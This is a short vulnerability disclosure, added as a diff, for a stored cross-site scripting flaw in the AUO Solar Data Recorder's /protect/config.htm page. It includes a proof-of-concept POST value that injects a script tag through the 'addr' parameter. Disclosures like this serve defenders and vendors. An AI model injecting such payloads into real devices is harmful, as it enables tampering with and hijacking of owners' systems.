@@ -1,0 +1,17 @@
+# Exploit Title: AUO Solar Data Recorder - Stored XSS
+# Date: 2019-04-16
+# Exploit Author: Luca.Chiou
+# Vendor Homepage: https://www.auo.com/zh-TW
+# Version: AUO Solar Data Recorder all versions prior to v1.3.0
+# Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index
+
+# 1. Description:
+# In AUO Solar Data Recorder web page,
+# user can modify the system settings by access the /protect/config.htm.
+# Attackers can inject malicious XSS code in parameter "addr" of post data.
+# The value of addr will be stored in database, so that cause a stored XSS vulnerability.
+
+# 2. Proof of Concept:
+# Browse http://<Your<http://%3cYour> Modem IP>/protect/config.htm
+# Send this post data:
+ addr= "<script>alert(123)</script>&dhcp=1
